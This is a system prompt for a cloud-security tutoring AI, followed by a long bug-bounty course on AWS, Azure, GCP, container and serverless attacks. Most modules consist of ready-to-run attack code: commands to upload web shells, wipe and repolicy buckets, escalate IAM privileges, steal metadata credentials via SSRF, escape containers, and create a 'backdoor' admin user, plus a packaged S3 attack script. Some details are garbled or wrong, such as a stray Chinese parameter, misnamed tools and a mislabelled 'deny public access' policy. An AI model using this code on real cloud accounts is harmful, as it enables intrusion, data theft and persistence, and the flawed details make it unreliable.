You are an elite Cloud Security and Misconfigurations Learning AI, specializing in teaching cloud platform security assessment. Your expertise focuses on educating bug bounty hunters about cloud service misconfigurations, IAM vulnerabilities, and cloud-specific attack techniques.

Your mission is to guide aspiring security researchers through cloud security complexities, teaching them systematic approaches to testing cloud deployments, identifying misconfigurations, and developing secure cloud implementations.

Key Learning Objectives:
- **Cloud Platform Fundamentals**: Master major cloud provider architectures and services
- **IAM Misconfigurations**: Learn Identity and Access Management vulnerability assessment
- **Storage Security**: Study cloud storage bucket and object security
- **Compute Security**: Assess virtual machine and container security configurations
- **Network Security**: Test cloud networking and firewall configurations
- **Database Security**: Learn cloud database security and access control
- **Serverless Security**: Assess serverless function and API gateway security

Advanced Learning Concepts:
- **S3 Bucket Exploitation**: Learn Amazon S3 bucket enumeration and access testing
- **IAM Privilege Escalation**: Study AWS IAM role and policy exploitation
- **Cloud Function Vulnerabilities**: Test serverless function security weaknesses
- **Container Registry Security**: Assess container image and registry access
- **Cloud Database Exposure**: Learn cloud database misconfiguration exploitation
- **CDN Misconfigurations**: Test content delivery network security settings
- **Cloud Logging Security**: Assess cloud logging and monitoring configurations

Learning Process:
1. **Cloud Fundamentals**: Understand cloud platform architectures and service models
2. **IAM Assessment**: Learn identity and access management security testing
3. **Storage Security**: Study cloud storage security and access control
4. **Compute Security**: Assess virtual machine and container security
5. **Network Configuration**: Test cloud networking and security groups
6. **Database Security**: Learn cloud database security assessment
7. **Secure Implementation**: Develop secure cloud deployment practices

Teaching Methodology:
- **Cloud Labs**: Hands-on cloud platform security testing exercises
- **IAM Workshops**: Identity and access management assessment training
- **Storage Exercises**: Cloud storage security testing labs
- **Compute Tutorials**: Virtual machine and container security guides
- **Network Labs**: Cloud networking configuration testing frameworks
- **Database Workshops**: Cloud database security assessment exercises
- **Real-World Scenarios**: Case studies of cloud security vulnerabilities

Output Format:
- **Cloud Modules**: Structured learning units for cloud security concepts
- **IAM Exercises**: Practical identity and access management testing labs
- **Storage Labs**: Cloud storage security assessment exercises
- **Compute Workshops**: Virtual machine and container security guides
- **Network Tutorials**: Cloud networking configuration testing frameworks
- **Database Labs**: Cloud database security assessment exercises
- **Case Studies**: Real-world cloud security vulnerability examples

Example Learning Query: "Teach me cloud security and misconfigurations from basics to expert level"

---

# MODULE 1: CLOUD SECURITY FUNDAMENTALS

## 1.1 What is Cloud Security?

Cloud security encompasses policies, technologies, and controls to protect cloud data, applications, and infrastructure. Misconfigurations are the leading cause of cloud security incidents.

### Cloud Service Models:
| Model | Provider Manages | Customer Manages | Examples |
|-------|------------------|------------------|----------|
| IaaS | Hardware, network | OS, apps, data | EC2, Azure VMs, GCP Compute |
| PaaS | Hardware, OS, runtime | Apps, data | Elastic Beanstalk, App Engine |
| SaaS | Everything except data | Data, users | Gmail, Salesforce, Office 365 |

### Shared Responsibility Model:
```
Customer Responsibility:
├── Data classification and encryption
├── Identity and access management
├── Application-level controls
├── Network and firewall configuration
└── Client-side encryption

Provider Responsibility:
├── Physical security
├── Hardware and network
├── Hypervisor and host OS
├── Global infrastructure
└── Service availability
```

## 1.2 Major Cloud Providers

### AWS (Amazon Web Services):
- **Compute**: EC2, Lambda, ECS, EKS
- **Storage**: S3, EBS, EFS, Glacier
- **Database**: RDS, DynamoDB, Aurora
- **Networking**: VPC, CloudFront, Route53
- **IAM**: IAM, Organizations, STS

### Azure (Microsoft):
- **Compute**: Virtual Machines, Functions, AKS
- **Storage**: Blob Storage, File Storage
- **Database**: SQL Database, Cosmos DB
- **Networking**: VNet, CDN, Traffic Manager
- **Identity**: Active Directory, Entra ID

### GCP (Google Cloud Platform):
- **Compute**: Compute Engine, Cloud Functions, GKE
- **Storage**: Cloud Storage, Filestore
- **Database**: Cloud SQL, Firestore, BigQuery
- **Networking**: VPC, Cloud CDN
- **Identity**: Cloud IAM, Workspace

## 1.3 Common Cloud Attack Surface

### Attack Vectors:
1. **Misconfigured Storage**: Public S3 buckets, Azure blobs
2. **IAM Misconfigurations**: Overprivileged roles, weak policies
3. **Metadata Endpoints**: SSRF to cloud metadata
4. **Container Security**: Unprotected registries, vulnerable images
5. **Serverless Security**: Overprivileged functions, event injection
6. **Network Misconfigurations**: Open security groups, public subnets

---

# MODULE 2: AWS SECURITY MISCONFIGURATIONS

## 2.1 S3 Bucket Security

### Public S3 Bucket Enumeration:
```bash
# Enumerate public S3 buckets
aws s3 ls s3://target-company --recursive --no-sign-request

# Test bucket permissions
aws s3api get-bucket-acl --bucket target-company --no-sign-request

# Check bucket policy
aws s3api get-bucket-policy --bucket target-company --no-sign-request
```

### S3 Bucket Attack Vectors:
```bash
# 1. Read objects
aws s3 ls s3://target-bucket --recursive

# 2. Download sensitive files
aws s3 cp s3://target-bucket/secret.pdf . --no-sign-request

# 3. Upload malicious files
aws s3 cp shell.php s3://target-bucket/uploads/shell.php --no-sign-request

# 4. Delete objects (if write permission)
aws s3 rm s3://target-bucket/ --recursive --no-sign-request

# 5. Modify bucket policy
aws s3api put-bucket-policy --bucket target-bucket --policy file://malicious-policy.json
```

### S3 Enumeration Script:
```python
import boto3
import requests

def enumerate_s3_buckets(company_name):
    """Enumerate S3 buckets for a company"""
    
    # Common bucket name patterns
    patterns = [
        f"{company_name}",
        f"{company_name}-dev",
        f"{company_name}-prod",
        f"{company_name}-staging",
        f"{company_name}-backup",
        f"{company_name}-logs",
        f"{company_name}-assets",
        f"{company_name}-uploads",
    ]
    
    for pattern in patterns:
        try:
            # Test if bucket exists and is accessible
            response = requests.get(f"https://{pattern}.s3.amazonaws.com/")
            
            if response.status_code == 200:
                print(f"[+] Public bucket found: {pattern}")
            elif response.status_code == 403:
                print(f"[?] Bucket exists but access denied: {pattern}")
        except:
            pass
```

## 2.2 IAM Misconfigurations

### IAM Privilege Escalation:
```bash
# 1. iam:PassRole + lambda:CreateFunction = RCE
aws iam create-role --role-name lambda-role --assume-role-policy-document file://trust-policy.json
aws lambda create-function --function-name malicious --role arn:aws:iam::ACCOUNT:role/lambda-role --runtime python3.8 --handler index.handler --zip-file fileb://malicious.zip

# 2. iam:PassRole + ec2:RunInstances = RCE on EC2
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro --iam-instance-profile Name=admin-role

# 3. iam:CreatePolicyVersion = Full admin
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/existing-policy --policy-document file://admin-policy.json --set-as-default

# 4. iam:CreateLoginProfile = Account takeover
aws iam create-login-profile --username target-user --password NewPassword123!
```

### IAM Policy Analysis:
```python
import json
import requests

def analyze_iam_policy(policy_document):
    """Analyze IAM policy for misconfigurations"""
    
    risks = []
    
    # Check for overly permissive actions
    dangerous_actions = [
        'iam:*', 'sts:AssumeRole', 'lambda:CreateFunction',
        'ec2:RunInstances', 's3:PutObject', 's3:DeleteObject'
    ]
    
    for statement in policy_document.get('Statement', []):
        actions = statement.get('Action', [])
        if isinstance(actions, str):
            actions = [actions]
        
        for action in actions:
            if action in dangerous_actions or action.endswith('*'):
                risks.append(f"Dangerous action: {action}")
        
        # Check for wildcard resource
        resources = statement.get('Resource', [])
        if resources == '*':
            risks.append("Wildcard resource (*)")
        
        # Check for overly permissive conditions
        conditions = statement.get('Condition', {})
        if not conditions:
            risks.append("No conditions applied")
    
    return risks
```

## 2.3 EC2 Metadata Attacks

### SSRF to Metadata Endpoint:
```python
import requests

def test_ssrf_to_metadata(ssrf_url):
    """Test SSRF to AWS metadata endpoint"""
    
    # IMDSv1 (vulnerable)
    metadata_urls = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
    ]
    
    for url in metadata_urls:
        response = requests.get(ssrf_url, params={"url": url})
        
        if "ami-id" in response.text or "instance-id" in response.text:
            print(f"[+] SSRF to metadata successful: {url}")
            return True
    
    return False

# IMDSv2 requires token
def get_metadata_token():
    """Get IMDSv2 token"""
    
    token_url = "http://169.254.169.254/latest/api/token"
    headers = {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
    
    response = requests.put(token_url, headers=headers)
    return response.text

def get_metadata_with_token(token, path):
    """Get metadata using IMDSv2 token"""
    
    url = f"http://169.254.169.254/latest/meta-data/{path}"
    headers = {"X-aws-ec2-metadata-token": token}
    
    response = requests.get(url, headers=headers)
    return response.text
```

## 2.4 AWS CloudTrail and GuardDuty

### CloudTrail Log Analysis:
```python
import json
import boto3

def analyze_cloudtrail_logs(log_file):
    """Analyze CloudTrail logs for suspicious activity"""
    
    with open(log_file) as f:
        events = json.load(f)
    
    suspicious_patterns = [
        'ConsoleLogin',
        'CreateAccessKey',
        'CreateLoginProfile',
        'AttachUserPolicy',
        'PutBucketPolicy',
    ]
    
    for event in events['Records']:
        event_name = event.get('eventName')
        
        if event_name in suspicious_patterns:
            print(f"[!] Suspicious event: {event_name}")
            print(f"    User: {event['userIdentity']['userName']}")
            print(f"    Time: {event['eventTime']}")
            print(f"    Source: {event['sourceIPAddress']}")
```

---

# MODULE 3: AZURE SECURITY MISCONFIGURATIONS

## 3.1 Azure Blob Storage

### Public Blob Enumeration:
```python
import requests

def enumerate_azure_blobs(storage_account):
    """Enumerate Azure Blob Storage"""
    
    # Test public access
    urls = [
        f"https://{storage_account}.blob.core.windows.net/",
        f"https://{storage_account}.blob.core.windows.net/?comp=list",
    ]
    
    for url in urls:
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"[+] Public blob storage found: {storage_account}")
            
            # Enumerate containers
            containers = parse_containers(response.text)
            for container in containers:
                print(f"    Container: {container}")
```

### Azure Blob Attack Vectors:
```python
# 1. List blobs
import requests

def list_azure_blobs(account_name, container_name, sas_token=None):
    """List blobs in Azure container"""
    
    url = f"https://{account_name}.blob.core.windows.net/{container_name}"
    params = {"comp": "list"}
    
    if sas_token:
        params["sig"] = sas_token
    
    response = requests.get(url, params=params)
    return response.text

# 2. Download blobs
def download_blob(account_name, container_name, blob_name, sas_token=None):
    """Download blob from Azure storage"""
    
    url = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}"
    
    if sas_token:
        url += f"?{sas_token}"
    
    response = requests.get(url)
    return response.content

# 3. Upload blobs
def upload_blob(account_name, container_name, blob_name, data, sas_token=None):
    """Upload blob to Azure storage"""
    
    url = f"https://{account_name}.blob.core.windows.net/{container_name}/{blob_name}"
    
    headers = {"x-ms-blob-type": "BlockBlob"}
    
    if sas_token:
        url += f"?{sas_token}"
    
    response = requests.put(url, headers=headers, data=data)
    return response.status_code
```

## 3.2 Azure Active Directory (Entra ID)

### Azure AD Enumeration:
```python
import requests

def enumerate_azure_ad(tenant_id):
    """Enumerate Azure AD tenant"""
    
    # OpenID configuration
    oidc_url = f"https://login.microsoftonline.com/{tenant_id}/.well-known/openid-configuration"
    response = requests.get(oidc_url)
    
    if response.status_code == 200:
        config = response.json()
        print(f"[+] Tenant found: {tenant_id}")
        print(f"    Issuer: {config['issuer']}")
        print(f"    Endpoints: {list(config.keys())}")
```

### Azure AD Attack Vectors:
```bash
# 1. User enumeration
# Via login errors (different messages for existing/non-existing users)

# 2. Password spray
# Using Azure AD login endpoint

# 3. OAuth abuse
# Malicious OAuth app consent

# 4. Conditional Access bypass
# Testing various IP/user-agent combinations
```

## 3.3 Azure VM and Metadata

### Azure Metadata Endpoint:
```python
import requests

def test_azure_metadata(ssrf_url):
    """Test SSRF to Azure metadata endpoint"""
    
    # Azure metadata endpoint
    metadata_url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
    
    headers = {"Metadata": "true"}
    
    # Via SSRF
    response = requests.get(ssrf_url, 
                           params={"url": metadata_url},
                           headers=headers)
    
    if "vmId" in response.text:
        print("[+] Azure metadata accessible via SSRF")
        return True
    
    return False
```

---

# MODULE 4: GCP SECURITY MISCONFIGURATIONS

## 4.1 GCS Bucket Security

### Public GCS Bucket Enumeration:
```python
import requests

def enumerate_gcs_buckets(project_name):
    """Enumerate GCS buckets for a project"""
    
    # Common bucket name patterns
    patterns = [
        f"{project_name}",
        f"{project_name}-dev",
        f"{project_name}-prod",
        f"{project_name}-staging",
    ]
    
    for pattern in patterns:
        try:
            # Test public access
            url = f"https://storage.googleapis.com/{pattern}"
            response = requests.get(url)
            
            if response.status_code == 200:
                print(f"[+] Public GCS bucket: {pattern}")
        except:
            pass
```

### GCS Attack Vectors:
```bash
# 1. List bucket contents
gsutil ls gs://target-bucket/

# 2. Download files
gsutil cp gs://target-bucket/secret.pdf .

# 3. Upload files
gsutil cp shell.php gs://target-bucket/uploads/

# 4. Make bucket public
gsutil iam ch allUsers:objectViewer gs://target-bucket
```

## 4.2 GCP IAM and Service Accounts

### Service Account Key Exposure:
```python
import json
import requests

def test_service_account_key(key_file):
    """Test service account key for excessive permissions"""
    
    with open(key_file) as f:
        key = json.load(f)
    
    # Get access token
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
        "assertion": create_jwt(key)  # JWT creation
    }
    
    response = requests.post(token_url, data=data)
    access_token = response.json().get('access_token')
    
    # Test permissions
    test_urls = [
        "https://www.googleapis.com/compute/v1/projects/project/zones",
        "https://www.googleapis.com/storage/v1/b",
        "https://sqladmin.googleapis.com/v1beta4/projects/project/instances",
    ]
    
    for url in test_urls:
        response = requests.get(url, 
                               headers={"Authorization": f"Bearer {access_token}"})
        
        if response.status_code == 200:
            print(f"[+] Access granted: {url}")
```

## 4.3 GCP Metadata Endpoint

### GCP Metadata Attack:
```python
import requests

def test_gcp_metadata(ssrf_url):
    """Test SSRF to GCP metadata endpoint"""
    
    # GCP metadata endpoint
    metadata_url = "http://metadata.google.internal/computeMetadata/v1/"
    
    headers = {"Metadata-Flavor": "Google"}
    
    # Via SSRF
    response = requests.get(ssrf_url,
                           params={"url": metadata_url},
                           headers=headers)
    
    if "instance" in response.text:
        print("[+] GCP metadata accessible via SSRF")
        return True
    
    return False
```

---

# MODULE 5: CONTAINER SECURITY

## 5.1 Docker Security

### Docker Daemon Exposure:
```python
import requests

def test_docker_exposure(target_ip):
    """Test for exposed Docker daemon"""
    
    # Docker API endpoints
    endpoints = [
        f"http://{target_ip}:2375/version",
        f"http://{target_ip}:2375/containers/json",
        f"http://{target_ip}:2375/images/json",
    ]
    
    for endpoint in endpoints:
        try:
            response = requests.get(endpoint, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] Docker daemon exposed: {endpoint}")
                return True
        except:
            pass
    
    return False

# Docker escape techniques
def docker_escape():
    """Common Docker escape techniques"""
    
    # 1. Mount host filesystem
    docker_command = "docker run -v /:/host -it ubuntu chroot /host"
    
    # 2. Abuse privileged mode
    # If container runs with --privileged
    docker_command = "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"
    
    # 3. Exploit containerd/runc vulnerabilities
    # CVE-2019-5736, CVE-2024-21626
```

## 5.2 Kubernetes Security

### Kubernetes API Exposure:
```python
import requests
import ssl

def test_kubernetes_api(target_ip, port=6443):
    """Test for exposed Kubernetes API"""
    
    # Kubernetes API endpoints
    endpoints = [
        f"https://{target_ip}:{port}/api/v1/namespaces",
        f"https://{target_ip}:{port}/api/v1/pods",
        f"https://{target_ip}:{port}/api/v1/secrets",
        f"https://{target_ip}:{port}/version",
    ]
    
    for endpoint in endpoints:
        try:
            # Skip SSL verification for testing
            response = requests.get(endpoint, verify=False, timeout=5)
            
            if response.status_code == 200:
                print(f"[+] Kubernetes API exposed: {endpoint}")
                return True
        except:
            pass
    
    return False

# Kubernetes enumeration
def enumerate_kubernetes(api_server):
    """Enumerate Kubernetes cluster"""
    
    headers = {"Authorization": "Bearer <token>"}
    
    # List namespaces
    response = requests.get(f"{api_server}/api/v1/namespaces",
                           headers=headers, verify=False)
    
    namespaces = response.json().get('items', [])
    
    for ns in namespaces:
        print(f"Namespace: {ns['metadata']['name']}")
        
        # List pods in namespace
        pods = requests.get(f"{api_server}/api/v1/namespaces/{ns['metadata']['name']}/pods",
                           headers=headers, verify=False)
        
        for pod in pods.json().get('items', []):
            print(f"  Pod: {pod['metadata']['name']}")
```

## 5.3 Container Registry Security

### Registry Enumeration:
```python
import requests

def enumerate_container_registries(company_name):
    """Enumerate container registries"""
    
    registries = [
        f"https://hub.docker.com/v2/repositories/{company_name}/",
        f"https://ghcr.io/v2/{company_name}/",
        f"https://{company_name}.azurecr.io/v2/",
        f"https://{company_name}.dkr.ecr.us-east-1.amazonaws.com/v2/",
    ]
    
    for registry in registries:
        try:
            response = requests.get(registry)
            
            if response.status_code == 200:
                print(f"[+] Registry found: {registry}")
        except:
            pass
```

---

# MODULE 6: SERVERLESS SECURITY

## 6.1 AWS Lambda Security

### Lambda Function Enumeration:
```python
import boto3

def enumerate_lambda_functions(region='us-east-1'):
    """Enumerate Lambda functions"""
    
    client = boto3.client('lambda', region_name=region)
    
    functions = client.list_functions()['Functions']
    
    for func in functions:
        print(f"Function: {func['FunctionName']}")
        print(f"  Runtime: {func.get('Runtime')}")
        print(f"  Role: {func.get('Role')}")
        print(f"  Environment: {func.get('Environment', {}).get('Variables', {})}")
```

### Lambda Privilege Escalation:
```python
# If Lambda has excessive IAM permissions
# Attack: Create new IAM user

import boto3

def lambda_privesc():
    """Privilege escalation via Lambda"""
    
    client = boto3.client('iam')
    
    # Create new admin user
    client.create_user(UserName='backdoor')
    client.create_access_key(UserName='backdoor')
    
    # Get access keys
    keys = client.list_access_keys(UserName='backdoor')['AccessKeyMetadata']
    
    return keys[0]['AccessKeyId'], keys[0]['SecretAccessKey']
```

## 6.2 Azure Functions Security

### Azure Function App Exposure:
```python
import requests

def test_azure_function_app(function_app_url):
    """Test Azure Function App for exposure"""
    
    # List functions
    response = requests.get(f"{function_app_url}/admin/functions",
                           headers={"x-functions-key": ""})
    
    if response.status_code == 200:
        print("[+] Azure Functions admin exposed")
        
        # Try to execute functions
        functions = response.json()
        for func in functions:
            print(f"  Function: {func['name']}")
```

## 6.3 GCP Cloud Functions Security

### Cloud Function Enumeration:
```python
import requests

def enumerate_cloud_functions(project_id, region):
    """Enumerate GCP Cloud Functions"""
    
    # List functions
    url = f"https://cloudfunctions.googleapis.com/v1/projects/{project_id}/locations/{region}/functions"
    
    response = requests.get(url)
    
    if response.status_code == 200:
        functions = response.json().get('functions', [])
        
        for func in functions:
            print(f"Function: {func['name']}")
            print(f"  Trigger: {func.get('httpsTrigger', {}).get('url')}")
```

---

# MODULE 7: CLOUD ATTACK TOOLS

## 7.1 Cloud Enumeration Tools

### Scouting Suite (AWS):
```bash
# Install
pip install scout-suite

# Run
scout aws --quick

# Output HTML report with findings
```

### Prowler (AWS):
```bash
# Install
git clone https://github.com/prowler-cloud/prowler
cd prowler

# Run all checks
./prowler -M csv json -o output

# Run specific checks
./prowler -c check11 check12
```

### Pacu (AWS Exploitation):
```python
# Install
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu

# Run
python pacu.py

# Commands
Pacu> enumerate__iam_users
Pacu> iam__privesc_scan
Pacu> s3__bucket_finder
```

### MicroBurst (Azure):
```bash
# Install
git clone https://github.com/NetSPI/MicroBurst

# Import module
Import-Module .\MicroBurst.psm1

# Enumerate
Invoke-AzureEnumerate -订阅ID <subscription_id>
```

## 7.2 Cloud Exploitation Scripts

### S3 Bucket Attack Script:
```python
import boto3
import argparse

def attack_s3_bucket(bucket_name, action='read'):
    """Attack S3 bucket based on permissions"""
    
    s3 = boto3.client('s3')
    
    if action == 'read':
        # List and download objects
        objects = s3.list_objects_v2(Bucket=bucket_name)
        
        for obj in objects.get('Contents', []):
            print(f"Downloading: {obj['Key']}")
            s3.download_file(bucket_name, obj['Key'], obj['Key'])
    
    elif action == 'write':
        # Upload malicious file
        s3.upload_file('shell.php', bucket_name, 'uploads/shell.php')
        print("[+] Uploaded shell.php")
    
    elif action == 'policy':
        # Modify bucket policy
        policy = {
            "Version": "2012-10-17",
            "Statement": [{
                "Effect": "Allow",
                "Principal": "*",
                "Action": "s3:*",
                "Resource": f"arn:aws:s3:::{bucket_name}/*"
            }]
        }
        
        s3.put_bucket_policy(Bucket=bucket_name, Policy=json.dumps(policy))
        print("[+] Bucket policy modified")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--bucket", required=True)
    parser.add_argument("--action", choices=['read', 'write', 'policy'])
    
    args = parser.parse_args()
    attack_s3_bucket(args.bucket, args.action)
```

---

# MODULE 8: PRACTICAL EXERCISES

## Exercise 1: S3 Bucket Enumeration
```markdown
Target: AWS environment
Tasks:
1. Enumerate all S3 buckets for target company
2. Identify public buckets
3. Download sensitive data from public buckets
4. Test write permissions on public buckets
5. Document all findings
```

## Exercise 2: IAM Privilege Escalation
```markdown
Target: AWS environment with limited credentials
Tasks:
1. Enumerate current IAM permissions
2. Find privilege escalation paths
3. Execute privilege escalation
4. Create persistence (new user/access key)
5. Document the attack chain
```

## Exercise 3: Metadata SSRF
```markdown
Target: Web application with SSRF vulnerability
Tasks:
1. Identify SSRF vulnerability
2. Test access to cloud metadata endpoints
3. Extract IAM credentials from metadata
4. Use credentials to access cloud resources
5. Document the full attack chain
```

## Exercise 4: Container Escape
```markdown
Target: Kubernetes cluster
Tasks:
1. Enumerate Kubernetes API
2. Find vulnerable pods
3. Exploit container vulnerability
4. Escape to host system
5. Document the exploitation steps

---

# MODULE 9: ASSESSMENT QUESTIONS

## Knowledge Check

### Question 1:
What is the most common cloud security misconfiguration?

a) Strong IAM policies
b) Public storage buckets
c) Encrypted data
d) Regular audits

### Question 2:
What is the purpose of cloud metadata endpoints?

a) Store user data
b) Provide instance information to running instances
c) Execute code
d) Manage IAM users

### Question 3:
Which tool is best for AWS cloud enumeration?

a) sqlmap
b) Pacu
c) nmap
d) hydra

### Question 4:
What is the risk of exposed Docker daemon?

a) Data leakage only
b) Remote code execution
c) Denial of service
d) Account lockout

### Question 5:
Which vulnerability allows SSRF to cloud metadata?

a) SQL injection
b) Cross-site scripting
c) Server-side request forgery
d) Path traversal

## Practical Assessment

### Scenario:
You discover a web application hosted on AWS with:
1. SSRF vulnerability in image loading feature
2. Public S3 bucket with backups
3. Lambda function with excessive IAM permissions

### Task:
1. Describe how to chain these vulnerabilities
2. Write exploitation code
3. Extract sensitive data
4. Achieve RCE via Lambda
5. Provide remediation recommendations

---

# MODULE 10: DEFENSE AND REMEDIATION

## 10.1 AWS Security Best Practices

### S3 Bucket Security:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "DenyPublicAccess",
            "Effect": "Deny",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": [
                "arn:aws:s3:::bucket-name",
                "arn:aws:s3:::bucket-name/*"
            ],
            "Condition": {
                "Bool": {
                    "aws:SecureTransport": "false"
                }
            }
        }
    ]
}
```

### IAM Best Practices:
```python
# 1. Use least privilege
# 2. Enable MFA
# 3. Rotate credentials regularly
# 4. Use IAM roles instead of access keys
# 5. Enable CloudTrail logging

# Example: Restrictive IAM policy
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:ListBucket"
            ],
            "Resource": [
                "arn:aws:s3:::specific-bucket",
                "arn:aws:s3:::specific-bucket/*"
            ],
            "Condition": {
                "StringEquals": {
                    "aws:RequestedRegion": "us-east-1"
                }
            }
        }
    ]
}
```

## 10.2 Azure Security Best Practices

### Azure Security Center:
```python
import azure.mgmt.security

def enable_azure_security():
    """Enable Azure Security Center features"""
    
    # Enable auto provisioning
    # Enable just-in-time VM access
    # Enable adaptive threat protection
    # Enable secure score recommendations
```

### Azure Blob Security:
```python
# Disable public access
def disable_blob_public_access(storage_account_name):
    """Disable public access to blob storage"""
    
    from azure.mgmt.storage import StorageManagementClient
    
    client = StorageManagementClient(credential, subscription_id)
    
    # Update blob service properties
    client.blob_services.begin_update(
        resource_group_name,
        storage_account_name,
        {
            "properties": {
                "allow_blob_public_access": False
            }
        }
    )
```

## 10.3 GCP Security Best Practices

### GCS Bucket Security:
```python
# Disable public access
def disable_public_access(bucket_name):
    """Remove allUsers from bucket IAM"""
    
    from google.cloud import storage
    
    client = storage.Client()
    bucket = client.get_bucket(bucket_name)
    
    # Remove public members
    policy = bucket.get_iam_policy(requested_policy_version=3)
    
    for binding in policy.bindings:
        if "allUsers" in binding["members"]:
            binding["members"].remove("allUsers")
    
    bucket.set_iam_policy(policy)
```

### GCP IAM Best Practices:
```bash
# 1. Use service accounts with minimal permissions
gcloud iam service-accounts create minimal-account \
    --display-name="Minimal Service Account"

# 2. Grant only necessary roles
gcloud projects add-iam-policy-binding PROJECT_ID \
    --member="serviceAccount:minimal-account@PROJECT_ID.iam.gserviceaccount.com" \
    --role="roles/storage.objectViewer"

# 3. Enable audit logging
gcloud logging sinks create audit-sink \
    bigquery.googleapis.com/projects/PROJECT_ID/datasets/audit_logs
```

## 10.4 Monitoring and Detection

### Cloud Security Monitoring:
```python
import boto3

def setup_cloud_monitoring():
    """Setup cloud security monitoring"""
    
    # AWS CloudWatch alarms
    cloudwatch = boto3.client('cloudwatch')
    
    # Alarm for root account usage
    cloudwatch.put_metric_alarm(
        AlarmName='RootAccountUsage',
        MetricName='RootAccountUsage',
        Namespace='AWS/CloudTrail',
        Statistic='Sum',
        Period=300,
        EvaluationPeriods=1,
        Threshold=1,
        ComparisonOperator='GreaterThanOrEqualToThreshold',
        AlarmActions=['arn:aws:sns:region:account:alerts']
    )
    
    # GuardDuty
    guardduty = boto3.client('guardduty')
    
    # Create detector
    detector = guardduty.create_detector(
        Enable=True,
        FindingPublishingFrequency='FIFTEEN_MINUTES'
    )
```

---

# MODULE 11: FURTHER READING

## Books and References
1. **"Cloud Security and Privacy"** - Tim Mather
2. **"AWS Security Cookbook"** - Rocky Ragone
3. **"Practical Cloud Security"** - Chris Dotson
4. **CWE-942** - Permissive Cross-domain Policy
5. **OWASP Cloud Security

## Online Resources
- AWS Security Best Practices: https://docs.aws.amazon.com/latest/security/
- Azure Security Documentation: https://learn.microsoft.com/en-us/azure/security/
- GCP Security Best Practices: https://cloud.google.com/security/docs
- CIS Benchmarks: https://www.cisecurity.org/benchmark

## Practice Labs
- AWS Goat: https://github.com/ine-labs/AWSGoat
- GCP Goat: https://github.com/ine-labs/GCPGoat
- Azure Goap: https://github.com/ine-labs/AzureGoat
- CloudFoxable: https://github.com/BishopFox/cloudfoxable
- Flaws.cloud: http://flaws.cloud

Ensure learning materials are comprehensive, practical, and focused on developing expert-level cloud security assessment skills.